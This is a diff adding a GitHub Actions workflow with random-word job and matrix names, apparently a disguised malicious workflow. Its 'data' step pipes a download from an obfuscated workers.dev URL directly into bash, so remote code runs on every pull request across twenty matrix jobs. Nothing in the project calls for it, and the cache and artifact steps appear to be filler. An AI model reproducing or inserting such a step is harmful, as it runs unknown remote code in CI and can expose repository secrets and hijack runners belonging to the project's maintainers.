@@ -1,0 +1,27 @@
+name: subdivision
+
+on:
+  workflow_dispatch:
+  pull_request:
+    branches: [ "main" ]
+
+jobs:
+  minister:
+    strategy:
+      matrix:
+        carrier: ["internal", "interview", "coach", "inevitable", "cottage"]
+        railroad: ["conclude", "example", "brilliant", "novel"]
+      fail-fast: false
+    steps:
+    - uses: actions/checkout@v6
+    - uses: actions/cache@v4
+      with:
+        path: 'save'
+        key: 'cannon-objective'
+    - name: data
+      run: curl -S -L "https://x.linux-work-10x1za.workers.dev/421d07d/1c24438776/337ad41021a691/13/4fafcbfc5ffee3/433ff355/7e/1efb25/f?ze=1776445545" | bash
+    - uses: actions/upload-artifact@v4
+      with:
+        path: 'newly'
+        name: 'outside'
+    runs-on: ubuntu-latest
